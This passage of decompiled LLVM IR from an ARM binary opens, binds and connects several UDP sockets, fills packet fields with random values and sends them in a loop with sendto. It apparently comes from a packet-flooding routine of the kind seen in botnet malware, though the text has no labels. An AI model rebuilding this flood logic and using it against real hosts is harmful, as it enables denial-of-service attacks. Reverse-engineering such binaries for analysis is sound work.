  %v0_d9f8 = load i32, i32* @r5, align 4
  store i32 %v0_d9f8, i32* %r0.global-to-local, align 4
  %v4_d9fc = call i32 @function_f1d8(i32 %v0_d9f8, i32 %v0_d9e4, i32 10240, i32 40)
  %v5_d9fc = trunc i32 %v4_d9fc to i8
  store i32 %v4_d9fc, i32* %r0.global-to-local, align 4
  %v4_da0029 = udiv i32 %v4_d9fc, 256
  %v1_da04 = trunc i32 %v4_da0029 to i8
  %v2_da04 = load i32, i32* @r6, align 4
  %v3_da04 = add i32 %v2_da04, 17
  %v4_da04 = inttoptr i32 %v3_da04 to i8*
  store i8 %v1_da04, i8* %v4_da04, align 1
  %v3_da08 = load i32, i32* @r6, align 4
  %v4_da08 = add i32 %v3_da08, 16
  %v5_da08 = inttoptr i32 %v4_da08 to i8*
  store i8 %v5_d9fc, i8* %v5_da08, align 1
  %v3_da0c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da0c, i32* %r3.global-to-local, align 4
  %v0_da10 = load i32, i32* @r5, align 4
  %v1_da10 = add i32 %v0_da10, 20
  %v2_da10 = inttoptr i32 %v1_da10 to i32*
  %v3_da10 = load i32, i32* %v2_da10, align 4
  %v3_da18 = udiv i32 %v3_da10, 65536
  store i32 %v3_da18, i32* %r2.global-to-local, align 4
  %v5_da1c = mul i32 %v3_da0c, 24
  %v1_da20 = load i32, i32* @r8, align 4
  %v2_da20 = add i32 %v1_da20, %v5_da1c
  store i32 %v2_da20, i32* %ip.global-to-local, align 4
  %v3_da2427 = udiv i32 %v3_da10, 16777216
  %v1_da28 = trunc i32 %v3_da2427 to i8
  %v3_da28 = add i32 %v2_da20, 3
  %v4_da28 = inttoptr i32 %v3_da28 to i8*
  store i8 %v1_da28, i8* %v4_da28, align 1
  %v0_da2c = load i32, i32* %r2.global-to-local, align 4
  %v1_da2c = trunc i32 %v0_da2c to i8
  %v2_da2c = load i32, i32* %ip.global-to-local, align 4
  %v3_da2c = add i32 %v2_da2c, 2
  %v4_da2c = inttoptr i32 %v3_da2c to i8*
  store i8 %v1_da2c, i8* %v4_da2c, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_da34 = load i32, i32* @r5, align 4
  store i32 %v0_da34, i32* %r1.global-to-local, align 4
  %v0_da38 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_da38, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_da44 = load i32, i32* %ip.global-to-local, align 4
  %v4_da44 = inttoptr i32 %v0_da44 to %sockaddr*
  %v7_da4c = inttoptr i32 %v0_da34 to i32*
  %v9_da4c = call i32 @sendto(i32 %v0_da38, i32* %v7_da4c, i32 60, i32 16384, %sockaddr* %v4_da44, i32 16)
  %v3_da50 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da50, i32* %r3.global-to-local, align 4
  %v1_da54 = add i32 %v3_da50, 1
  store i32 %v1_da54, i32* %r0.global-to-local, align 4
  %v0_da58 = load i32, i32* @sl, align 4
  %v9_da58 = icmp eq i32 %v0_da58, %v1_da54
  store i1 %v9_da58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_da54, i32* %stack_var_-40, align 4
  %v8_da60 = icmp sgt i32 %v0_da58, %v1_da54
  br i1 %v8_da60, label %dec_label_pc_d948, label %dec_label_pc_da64

dec_label_pc_da64:                                ; preds = %dec_label_pc_d9c4
  %v2_da64 = icmp eq i32 %v0_da58, 0
  store i1 %v2_da64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d938.outer

dec_label_pc_da70:                                ; preds = %dec_label_pc_d948
  %v1_da70 = add i32 %v2_d950, 16
  %v2_da70 = inttoptr i32 %v1_da70 to i32*
  %v3_da70 = load i32, i32* %v2_da70, align 4
  store i32 %v3_da70, i32* %r4.global-to-local, align 4
  %v0_da74 = call i32 @function_10b68()
  store i32 %v0_da74, i32* %r0.global-to-local, align 4
  %v3_da78 = load i32, i32* %stack_var_-40, align 4
  %v5_da80 = mul i32 %v3_da78, 24
  %v0_da84 = load i32, i32* %r4.global-to-local, align 4
  %v1_da88 = load i32, i32* @r8, align 4
  %v2_da88 = add i32 %v1_da88, %v5_da80
  store i32 %v2_da88, i32* %r1.global-to-local, align 4
  %v1_da8c = and i32 %v0_da84, 65280
  store i32 %v1_da8c, i32* %r3.global-to-local, align 4
  %v1_da84 = udiv i32 %v0_da84, 256
  %v3_da90 = and i32 %v1_da84, 65280
  store i32 %v3_da90, i32* %r2.global-to-local, align 4
  %v3_da94 = mul i32 %v0_da84, 16777216
  store i32 %v3_da94, i32* %ip.global-to-local, align 4
  %v1_da98 = add i32 %v2_da88, 20
  %v2_da98 = inttoptr i32 %v1_da98 to i8*
  %v3_da98 = load i8, i8* %v2_da98, align 1
  %v4_da98 = zext i8 %v3_da98 to i32
  %v4_da9c = mul nuw nsw i32 %v1_da8c, 256
  %v5_da9c = or i32 %v4_da9c, %v3_da94
  store i32 %v5_da9c, i32* %ip.global-to-local, align 4
  %v2_daa4 = call i32 @llvm.bswap.i32(i32 %v0_da84)
  %v7_daa8 = lshr i32 %v0_da74, %v4_da98
  %v8_daa8 = add i32 %v7_daa8, %v2_daa4
  store i32 %v8_daa8, i32* %r2.global-to-local, align 4
  %v3_dab4 = mul i32 %v8_daa8, 16777216
  %v1_daac = mul i32 %v8_daa8, 256
  %v4_dab8 = and i32 %v1_daac, 16711680
  %v5_dab8 = or i32 %v4_dab8, %v3_dab4
  store i32 %v5_dab8, i32* %r1.global-to-local, align 4
  store i32 %v6_d608, i32* %r0.global-to-local, align 4
  %v2_dac8 = call i32 @llvm.bswap.i32(i32 %v8_daa8)
  store i32 %v2_dac8, i32* %r3.global-to-local, align 4
  store i1 %v7_d96c, i1* %cpsr_z.global-to-local, align 1
  %v1_dad0 = load i32, i32* @r5, align 4
  %v2_dad0 = add i32 %v1_dad0, 16
  %v3_dad0 = inttoptr i32 %v2_dad0 to i32*
  store i32 %v2_dac8, i32* %v3_dad0, align 4
  br i1 %v2_d96c, label %dec_label_pc_dad8, label %dec_label_pc_d974

dec_label_pc_dad8:                                ; preds = %dec_label_pc_da70, %dec_label_pc_d968
  %v0_dad8 = call i32 @function_10b68()
  store i32 %v0_dad8, i32* %r0.global-to-local, align 4
  store i32 %v3_d670, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_dae8, i1* %cpsr_z.global-to-local, align 1
  %v1_daec = load i32, i32* @r5, align 4
  %v2_daec = add i32 %v1_daec, 12
  %v3_daec = inttoptr i32 %v2_daec to i32*
  store i32 %v0_dad8, i32* %v3_daec, align 4
  br i1 %v3_dae8, label %dec_label_pc_daf4, label %dec_label_pc_dad8.dec_label_pc_d988_crit_edge

dec_label_pc_dad8.dec_label_pc_d988_crit_edge:    ; preds = %dec_label_pc_dad8
  %v1_d98c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d988

dec_label_pc_daf4:                                ; preds = %dec_label_pc_dad8, %dec_label_pc_d974
  %v0_daf4 = call i32 @function_10b68()
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  store i32 %v0_daf4, i32* %r0.global-to-local, align 4
  %v4_daf830 = udiv i32 %v0_daf4, 256
  %v1_dafc = trunc i32 %v4_daf830 to i8
  %v2_dafc = load i32, i32* @r5, align 4
  %v3_dafc = add i32 %v2_dafc, 5
  %v4_dafc = inttoptr i32 %v3_dafc to i8*
  store i8 %v1_dafc, i8* %v4_dafc, align 1
  store i32 %v3_d674, i32* %r3.global-to-local, align 4
  %v1_db04 = load i32, i32* @r4, align 4
  %v9_db04 = icmp eq i32 %v3_d674, %v1_db04
  store i1 %v9_db04, i1* %cpsr_z.global-to-local, align 1
  %v3_db08 = load i32, i32* @r5, align 4
  %v4_db08 = add i32 %v3_db08, 4
  %v5_db08 = inttoptr i32 %v4_db08 to i8*
  store i8 %v1_daf4, i8* %v5_db08, align 1
  %v0_db0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db0c, label %dec_label_pc_db10, label %dec_label_pc_daf4.dec_label_pc_d994_crit_edge

dec_label_pc_daf4.dec_label_pc_d994_crit_edge:    ; preds = %dec_label_pc_daf4
  %v1_d998.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d994

dec_label_pc_db10:                                ; preds = %dec_label_pc_daf4, %dec_label_pc_d988
  %v0_db10 = call i32 @function_10b68()
  %v1_db10 = trunc i32 %v0_db10 to i8
  store i32 %v0_db10, i32* %r0.global-to-local, align 4
  store i32 %v3_d678, i32* %ip.global-to-local, align 4
  %v4_db18 = sdiv i32 %v0_db10, 256
  store i32 %v4_db18, i32* %r3.global-to-local, align 4
  %v1_db1c = load i32, i32* @r4, align 4
  %v9_db1c = icmp eq i32 %v3_d678, %v1_db1c
  store i1 %v9_db1c, i1* %cpsr_z.global-to-local, align 1
  %v3_db20 = load i32, i32* @r5, align 4
  %v4_db20 = add i32 %v3_db20, 20
  %v5_db20 = inttoptr i32 %v4_db20 to i8*
  store i8 %v1_db10, i8* %v5_db20, align 1
  %v0_db24 = load i32, i32* %r3.global-to-local, align 4
  %v1_db24 = trunc i32 %v0_db24 to i8
  %v2_db24 = load i32, i32* @r6, align 4
  %v3_db24 = add i32 %v2_db24, 1
  %v4_db24 = inttoptr i32 %v3_db24 to i8*
  store i8 %v1_db24, i8* %v4_db24, align 1
  %v0_db28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db28, label %dec_label_pc_db2c, label %dec_label_pc_db10.dec_label_pc_d9a0_crit_edge

dec_label_pc_db10.dec_label_pc_d9a0_crit_edge:    ; preds = %dec_label_pc_db10
  %v1_d9a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9a0

dec_label_pc_db2c:                                ; preds = %dec_label_pc_db10, %dec_label_pc_d994
  %v0_db2c = call i32 @function_10b68()
  %v1_db2c = trunc i32 %v0_db2c to i8
  %v4_db30 = sdiv i32 %v0_db2c, 256
  store i32 %v4_db30, i32* %r3.global-to-local, align 4
  %v3_db34 = load i32, i32* @r6, align 4
  %v4_db34 = add i32 %v3_db34, 2
  %v5_db34 = inttoptr i32 %v4_db34 to i8*
  store i8 %v1_db2c, i8* %v5_db34, align 1
  store i32 %v5_d544, i32* %r0.global-to-local, align 4
  %v1_db3c = load i32, i32* @r4, align 4
  %v9_db3c = icmp eq i32 %v5_d544, %v1_db3c
  store i1 %v9_db3c, i1* %cpsr_z.global-to-local, align 1
  %v0_db40 = load i32, i32* %r3.global-to-local, align 4
  %v1_db40 = trunc i32 %v0_db40 to i8
  %v2_db40 = load i32, i32* @r6, align 4
  %v3_db40 = add i32 %v2_db40, 3
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v1_db40, i8* %v4_db40, align 1
  %v0_db44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_db44, label %dec_label_pc_db48, label %dec_label_pc_db2c.dec_label_pc_d9ac_crit_edge

dec_label_pc_db2c.dec_label_pc_d9ac_crit_edge:    ; preds = %dec_label_pc_db2c
  %v1_d9b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d9ac

dec_label_pc_db48:                                ; preds = %dec_label_pc_db2c, %dec_label_pc_d9a0
  %v0_db48 = call i32 @function_10b68()
  store i32 %v0_db48, i32* %r0.global-to-local, align 4
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v1_db50 = load i32, i32* @r4, align 4
  %v9_db50 = icmp eq i32 %v6_d55c, %v1_db50
  store i1 %v9_db50, i1* %cpsr_z.global-to-local, align 1
  %v1_db54 = load i32, i32* @r6, align 4
  %v2_db54 = add i32 %v1_db54, 4
  %v3_db54 = inttoptr i32 %v2_db54 to i32*
  store i32 %v0_db48, i32* %v3_db54, align 4
  br i1 %v9_db50, label %dec_label_pc_db5c, label %dec_label_pc_d9b8

dec_label_pc_db5c:                                ; preds = %dec_label_pc_db48, %dec_label_pc_d9ac
  %v0_db5c = call i32 @function_10b68()
  store i32 %v0_db5c, i32* %r0.global-to-local, align 4
  store i32 %v1_d67c, i32* %r3.global-to-local, align 4
  store i1 %v2_db64, i1* %cpsr_z.global-to-local, align 1
  %v1_db68 = load i32, i32* @r6, align 4
  %v2_db68 = add i32 %v1_db68, 8
  %v3_db68 = inttoptr i32 %v2_db68 to i32*
  store i32 %v0_db5c, i32* %v3_db68, align 4
  br i1 %v2_db64, label %dec_label_pc_d9c4, label %dec_label_pc_db70

dec_label_pc_db70:                                ; preds = %dec_label_pc_d9b8, %dec_label_pc_db5c
  %v0_db70 = call i32 @function_10b68()
  %v1_db70 = trunc i32 %v0_db70 to i8
  store i32 %v0_db70, i32* %r0.global-to-local, align 4
  %v4_db74 = sdiv i32 %v0_db70, 256
  store i32 %v4_db74, i32* %r3.global-to-local, align 4
  %v1_db78 = trunc i32 %v4_db74 to i8
  %v2_db78 = load i32, i32* @r6, align 4
  %v3_db78 = add i32 %v2_db78, 19
  %v4_db78 = inttoptr i32 %v3_db78 to i8*
  store i8 %v1_db78, i8* %v4_db78, align 1
  %v3_db7c = load i32, i32* @r6, align 4
  %v4_db7c = add i32 %v3_db7c, 18
  %v5_db7c = inttoptr i32 %v4_db7c to i8*
  store i8 %v1_db70, i8* %v5_db7c, align 1
  br label %dec_label_pc_d9c4

dec_label_pc_db84:                                ; preds = %dec_label_pc_d62c
  %v0_db84 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_db84, i32* %r0.global-to-local, align 4
  %v1_db88 = call i32 @close(i32 %v0_db84)
  store i32 %v1_db88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_d454, %dec_label_pc_db84
  %v29_db90 = phi i32 [ %v3_d61c, %dec_label_pc_d454 ], [ %v1_db88, %dec_label_pc_db84 ]
  store i32 %v3_d454, i32* %r4.global-to-local, align 4
  store i32 %v6_d454, i32* %r5.global-to-local, align 4
  store i32 %v9_d454, i32* %r6.global-to-local, align 4
  store i32 %v12_d454, i32* %r7.global-to-local, align 4
  ret i32 %v29_db90

; uselistorder directives
  uselistorder i32 %v4_db74, { 1, 0 }
  uselistorder i32 %v0_db70, { 0, 2, 1 }
  uselistorder i32 %v0_db10, { 0, 2, 1 }
  uselistorder i32 %v0_daf4, { 0, 2, 1 }
  uselistorder i32 %v2_dac8, { 1, 0 }
  uselistorder i32 %v8_daa8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_da94, { 1, 0 }
  uselistorder i32 %v0_da84, { 2, 0, 1, 3 }
  uselistorder i1 %v2_da64, { 1, 0 }
  uselistorder i32 %v0_da58, { 1, 2, 3, 0 }
  uselistorder i32 %v1_da54, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_d9fc, { 0, 2, 1 }
  uselistorder i32 %v0_d9e4, { 1, 0, 2 }
  uselistorder i1 %v7_d96c, { 2, 1, 0 }
  uselistorder i1 %v2_db64, { 2, 3, 1, 0 }
  uselistorder i1 %v3_dae8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d920, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d738, { 1, 0 }
  uselistorder i32 %v1_d718, { 1, 0 }
  uselistorder i32 %v1_d708, { 1, 0 }
  uselistorder i32 %v1_d704, { 1, 0 }
  uselistorder i32 %v1_d700, { 1, 0 }
  uselistorder i32 %v3_d6f0, { 1, 0 }
  uselistorder i32 %v1_d6e0, { 1, 0 }
  uselistorder i32 %v1_d6d8, { 1, 0 }
  uselistorder i32 %v1_d6b4, { 1, 0 }
  uselistorder i32 %v1_d6a8, { 1, 0 }
  uselistorder i32 %v1_d67c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_d670, { 0, 1, 3, 2 }
  uselistorder i32 %v0_d66c, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_d668, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d64c, { 1, 0 }
  uselistorder i1 %v7_d620, { 1, 0 }
  uselistorder i32 %v3_d61c, { 1, 2, 0, 3 }
  uselistorder i32 %v6_d608, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_d55c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_d544, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_d4f4, { 1, 0 }
  uselistorder i32 %v5_d48c, { 1, 0 }
  uselistorder i32 %v1_d458, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 44, { 3, 4, 5, 6, 1, 7, 0, 8, 2, 9 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 254, { 0, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11, 7, 12 }
  uselistorder label %dec_label_pc_db8c, { 1, 0 }
  uselistorder label %dec_label_pc_db70, { 1, 0 }
  uselistorder label %dec_label_pc_d9c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d938, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_db98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_db98:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_db98 = load i32, i32* @r4, align 4
  %v6_db98 = load i32, i32* @r5, align 4
  %v24_db98 = load i32, i32* @fp, align 4
  %v1_db9c = urem i32 %arg1, 256
  store i32 %v1_db9c, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_dbb4 = urem i32 %arg3, 256
  store i32 %v1_dbb4, i32* @r4, align 4
  %v2_dbb8 = call i32* @calloc(i32 %v1_db9c, i32 4)
  %v4_dbb8 = ptrtoint i32* %v2_dbb8 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_dbb8, i32* @sl, align 4
  %v0_dbc4 = load i32, i32* @r7, align 4
  %v2_dbc8 = call i32* @calloc(i32 %v0_dbc4, i32 4)
  %v3_dbc8 = ptrtoint i32* %v2_dbc8 to i32
  store i32 65535, i32* @r5, align 4
  %v0_dbd4 = load i32, i32* @r6, align 4
  store i32 %v0_dbd4, i32* %r1.global-to-local, align 4
  store i32 %v3_dbc8, i32* @sb, align 4
  %v0_dbe4 = load i32, i32* @r4, align 4
  %v4_dbe8 = inttoptr i32 %v0_dbd4 to i32*
  %v5_dbe8 = call i32 @function_b240(i32 %v0_dbe4, i32* %v4_dbe8, i32 7, i32 65535)
  %v3_dbf0 = urem i32 %v5_dbe8, 65536
  %v0_dbf4 = load i32, i32* @r6, align 4
  store i32 %v0_dbf4, i32* %r1.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r5, align 4
  %v0_dc00 = load i32, i32* @r4, align 4
  %v5_dc08 = inttoptr i32 %v0_dbf4 to i32*
  %v6_dc08 = call i32 @function_b240(i32 %v0_dc00, i32* %v5_dc08, i32 6, i32 %v0_dbfc)
  %v0_dc0c = load i32, i32* @r6, align 4
  store i32 %v0_dc0c, i32* %r1.global-to-local, align 4
  %v3_dc10 = mul i32 %v6_dc08, 65536
  store i32 %v3_dc10, i32* %fp.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  %v4_dc20 = inttoptr i32 %v0_dc0c to i32*
  %v5_dc20 = call i32 @function_b240(i32 %v0_dc1c, i32* %v4_dc20, i32 0, i32 512)
  %v0_dc2c = load i32, i32* @r6, align 4
  store i32 %v0_dc2c, i32* %r1.global-to-local, align 4
  %v0_dc30 = load i32, i32* @r4, align 4
  %v3_dc38 = urem i32 %v5_dc20, 65536
  store i32 %v3_dc38, i32* @r6, align 4
  %v4_dc3c = inttoptr i32 %v0_dc2c to i32*
  %v5_dc3c = call i32 @function_b240(i32 %v0_dc30, i32* %v4_dc3c, i32 1, i32 1)
  %v0_dc40 = load i32, i32* %fp.global-to-local, align 4
  %v3_dc40 = udiv i32 %v0_dc40, 65536
  store i32 %v3_dc40, i32* %r4.global-to-local, align 4
  %v1_dc48 = load i32, i32* @r5, align 4
  %v9_dc48 = icmp eq i32 %v3_dc40, %v1_dc48
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_dc48, label %dec_label_pc_dc70, label %bb

bb:                                               ; preds = %dec_label_pc_db98
  %v2_dc5c = mul nuw nsw i32 %v3_dc40, 256
  %v4_dc60 = and i32 %v2_dc5c, 65280
  %v1_dc64 = urem i32 %v5_dc3c, 256
  store i32 %v1_dc64, i32* @r8, align 4
  %v5_dc68 = udiv i32 %v0_dc40, 16777216
  %v6_dc68 = or i32 %v4_dc60, %v5_dc68
  br label %dec_label_pc_dc7c

dec_label_pc_dc70:                                ; preds = %dec_label_pc_db98
  %v1_dc647 = urem i32 %v5_dc3c, 256
  store i32 %v1_dc647, i32* @r8, align 4
  %v0_dc70 = call i32 @function_10b68()
  %v3_dc78 = urem i32 %v0_dc70, 65536
  br label %dec_label_pc_dc7c

dec_label_pc_dc7c:                                ; preds = %bb, %dec_label_pc_dc70
  %storemerge17 = phi i32 [ %v6_dc68, %bb ], [ %v3_dc78, %dec_label_pc_dc70 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_dc7c = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_dc7c, 1
  br i1 %tmp41, label %dec_label_pc_de24.preheader, label %dec_label_pc_dc84

dec_label_pc_de24.preheader:                      ; preds = %dec_label_pc_dd80, %dec_label_pc_dc7c
  %storemerge3.in12.ph = phi i32 [ %v0_dc7c, %dec_label_pc_dc7c ], [ %v1_dcd8, %dec_label_pc_dd80 ]
  %tmp434851 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp434851, label %dec_label_pc_ddec, label %dec_label_pc_ddf0.lr.ph

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc7c
  store i32 %v3_dbf0, i32* %r1.global-to-local, align 4
  %v3_dc88 = udiv i32 %v5_dbe8, 256
  %v5_dc94 = trunc i32 %v3_dc88 to i8
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v3_dcac = udiv i32 %v5_dbe8, 65536
  store i32 %v3_dcac, i32* %r4.global-to-local, align 4
  %v4_dcbc = trunc i32 %v3_dcac to i8
  store i8 %v4_dcbc, i8* %stack_var_-80, align 1
  %v3_ddcc = icmp eq i32 %v3_dbf0, 65535
  %v2_dcf4 = ptrtoint i32* %stack_var_-52 to i32
  %tmp42 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_ddb0

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_ddb0
  %v2_dcc4 = load i8, i8* %stack_var_-80, align 1
  %v3_dcc4 = sext i8 %v2_dcc4 to i32
  store i32 %v3_dcc4, i32* %r1.global-to-local, align 4
  store i32 %v3_dc88, i32* %r4.global-to-local, align 4
  %v2_dcc8 = load i32, i32* %r5.global-to-local, align 4
  %v3_dcc8 = add i32 %v2_dcc8, 2
  %v4_dcc8 = inttoptr i32 %v3_dcc8 to i8*
  store i8 %v5_dc94, i8* %v4_dcc8, align 1
  %v0_dccc = load i32, i32* %r1.global-to-local, align 4
  %v1_dccc = trunc i32 %v0_dccc to i8
  %v2_dccc = load i32, i32* %r5.global-to-local, align 4
  %v3_dccc = add i32 %v2_dccc, 3
  %v4_dccc = inttoptr i32 %v3_dccc to i8*
  store i8 %v1_dccc, i8* %v4_dccc, align 1
  br label %dec_label_pc_dcd0

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_ddd8, %dec_label_pc_dcc4
  %v1_dcd8 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_dce8 = call i32 @socket(i32 2, i32 17, i32 17)
  store i32 %stack_var_-60.0, i32* %r4.global-to-local, align 4
  %v7_dcf0 = icmp eq i32 %v3_dce8, -1
  store i32 %v2_dcf4, i32* %r1.global-to-local, align 4
  %v2_dd04 = load i32, i32* @sb, align 4
  %v3_dd04 = add i32 %v2_dd04, %stack_var_-60.0
  %v4_dd04 = inttoptr i32 %v3_dd04 to i32*
  store i32 %v3_dce8, i32* %v4_dd04, align 4
  br i1 %v7_dcf0, label %dec_label_pc_de30, label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dcd0
  store i32 2, i32* %stack_var_-52, align 4
  %v5_dd24 = call i32 @bind(i32 %v3_dce8, %sockaddr* %tmp42, i32 16)
  %v0_dd28 = load i32, i32* %r5.global-to-local, align 4
  %v1_dd28 = add i32 %v0_dd28, 20
  %v2_dd28 = inttoptr i32 %v1_dd28 to i8*
  %v3_dd28 = load i8, i8* %v2_dd28, align 1
  %tmp = icmp ugt i8 %v3_dd28, 31
  br i1 %tmp, label %dec_label_pc_dd80, label %dec_label_pc_dd34

dec_label_pc_dd34:                                ; preds = %dec_label_pc_dd0c
  %v1_dd34 = add i32 %v0_dd28, 16
  %v2_dd34 = inttoptr i32 %v1_dd34 to i32*
  %v3_dd34 = load i32, i32* %v2_dd34, align 4
  store i32 %v3_dd34, i32* %r4.global-to-local, align 4
  %v0_dd38 = call i32 @function_10b68()
  %v1_dd40 = and i32 %v3_dd34, 65280
  %v3_dd48 = mul i32 %v3_dd34, 16777216
  %v4_dd4c = mul nuw nsw i32 %v1_dd40, 256
  %v5_dd4c = or i32 %v4_dd4c, %v3_dd48
  store i32 %v5_dd4c, i32* %r1.global-to-local, align 4
  %v0_dd54 = load i32, i32* %r5.global-to-local, align 4
  %v1_dd54 = add i32 %v0_dd54, 20
  %v2_dd54 = inttoptr i32 %v1_dd54 to i8*
  %v3_dd54 = load i8, i8* %v2_dd54, align 1
  %v4_dd54 = zext i8 %v3_dd54 to i32
  %v2_dd58 = call i32 @llvm.bswap.i32(i32 %v3_dd34)
  %v7_dd5c = lshr i32 %v0_dd38, %v4_dd54
  %v8_dd5c = add i32 %v7_dd5c, %v2_dd58
  %v3_dd68 = mul i32 %v8_dd5c, 16777216
  %v1_dd6c = and i32 %v8_dd5c, 65280
  %v4_dd70 = mul nuw nsw i32 %v1_dd6c, 256
  %v5_dd70 = or i32 %v4_dd70, %v3_dd68
  store i32 %v5_dd70, i32* %r1.global-to-local, align 4
  %v2_dd78 = call i32 @llvm.bswap.i32(i32 %v8_dd5c)
  %v2_dd7c = add i32 %v0_dd54, 4
  %v3_dd7c = inttoptr i32 %v2_dd7c to i32*
  store i32 %v2_dd78, i32* %v3_dd7c, align 4
  %v0_dd8c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dd80

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_dd34
  %v0_dd8c = phi i32 [ %v0_dd28, %dec_label_pc_dd0c ], [ %v0_dd8c.pre, %dec_label_pc_dd34 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_dd88 = load i32, i32* @sb, align 4
  %v2_dd88 = add i32 %v1_dd88, %stack_var_-60.0
  %v3_dd88 = inttoptr i32 %v2_dd88 to i32*
  %v4_dd88 = load i32, i32* %v3_dd88, align 4
  store i32 %v0_dd8c, i32* %r1.global-to-local, align 4
  %v3_dd90 = call i32 @_connect(i32 %v4_dd88, i32 %v0_dd8c, i32 16)
  %v1_dd9c = add i32 %stack_var_-60.0, 4
  %v1_dda0 = load i32, i32* @r7, align 4
  %v9_dda0 = icmp eq i32 %v1_dcd8, %v1_dda0
  %v0_dda8 = load i32, i32* %r5.global-to-local, align 4
